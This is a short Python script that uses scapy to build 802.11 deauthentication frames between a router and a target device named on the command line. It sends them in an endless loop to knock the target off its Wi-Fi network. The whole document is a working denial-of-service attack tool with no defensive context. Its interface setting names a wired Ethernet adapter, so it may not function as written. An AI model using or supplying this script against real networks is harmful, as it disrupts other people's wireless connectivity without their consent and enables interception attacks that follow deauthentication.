import sys
from scapy.all import *

show_interfaces();

router = sys.argv[1];
target = sys.argv[2];

router_pkt = RadioTap()/Dot11(addr1=target, addr2=router, addr3=router)/Dot11Deauth();
cli_pkt = RadioTap()/Dot11(addr1=router, addr2=target, addr3=target)/Dot11Deauth();

while True:
    sendp(router_pkt,iface="Realtek PCIe GBE Family Controller");
    sendp(cli_pkt,iface="Realtek PCIe GBE Family Controller");